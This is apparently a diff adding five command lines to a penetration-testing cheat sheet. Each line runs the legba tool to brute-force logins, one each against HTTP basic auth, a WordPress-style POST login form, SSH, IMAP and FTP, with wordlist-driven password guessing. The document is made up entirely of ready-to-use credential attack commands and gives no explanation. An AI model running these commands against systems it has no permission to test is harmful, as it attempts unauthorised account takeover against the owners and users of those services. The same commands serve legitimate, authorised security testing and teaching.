@@ -1,0 +1,5 @@
+legba http.basic --username admin --password `fzf-wordlists` --target http://$IP:$PORT
+legba http --username $USER --password `fzf-wordlists` --target http://$TARGET --http-method POST --http-success-codes 302 --http-payload 'log={USERNAME}&pwd={PASSWORD}'
+legba ssh --username $USER --password `fzf-wordlists` --target $IP:22
+legba imap --username $USER --password `fzf-wordlists` --target $IP:993
+legba ftp --username $USER --password `fzf-wordlists` --target $IP:21
